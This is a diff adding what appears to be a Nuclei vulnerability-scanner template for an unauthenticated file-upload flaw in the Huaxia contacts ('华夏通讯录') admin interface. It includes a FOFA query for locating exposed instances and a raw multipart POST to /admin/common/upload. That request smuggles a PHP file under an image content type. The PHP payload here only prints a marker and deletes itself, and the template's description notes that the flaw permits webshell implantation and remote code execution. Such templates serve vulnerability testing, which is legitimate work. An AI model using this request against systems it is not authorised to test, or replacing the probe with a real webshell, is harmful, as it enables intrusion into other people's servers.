@@ -1,0 +1,35 @@
+id: huaxia-contacts-upload-file-upload
+
+info:
+  name: "华夏通讯录 admin 接口未授权文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: icon_hash="1403225079" && ":) APPV1"
+        华夏通讯录由于鉴权逻辑未正确实施，导致攻击者可通过 /admin/common/upload 接口在未授权状态下上传任意文件，实现远程代码执行或WebShell植入。
+  tags: 华夏通讯录
+
+http:
+- raw:
+  - |
+    POST /admin/common/upload HTTP/2
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=---------------------------289666258334735365651210512949
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    X-Requested-With: XMLHttpRequest
+
+    -----------------------------289666258334735365651210512949
+    Content-Disposition: form-data; name="file"; filename="NTest.php"
+    Content-Type: image/png
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    -----------------------------289666258334735365651210512949--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'uploads'
